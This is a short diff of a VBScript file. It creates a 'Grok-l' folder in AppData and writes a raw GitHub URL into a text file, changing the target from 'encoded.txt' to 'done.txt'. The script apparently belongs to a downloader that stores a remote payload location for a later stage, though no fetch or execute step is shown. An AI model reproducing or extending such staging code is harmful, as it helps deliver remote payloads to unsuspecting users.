@@ -11,7 +11,7 @@ strFolder = strAppData & "\Grok-l"
 If Not FSO.FolderExists(strFolder) Then FSO.CreateFolder(strFolder)
 
 Set txtFile = FSO.CreateTextFile(strFolder & "\l.txt", True)
-txtFile.WriteLine "https://raw.githubusercontent.com/opm4opm4/code/main/encoded.txt"
+txtFile.WriteLine "https://raw.githubusercontent.com/opm4opm4/code/main/done.txt"
 txtFile.Close
 
 Set txtFile2 = FSO.CreateTextFile(strFolder & "\m.txt", True)
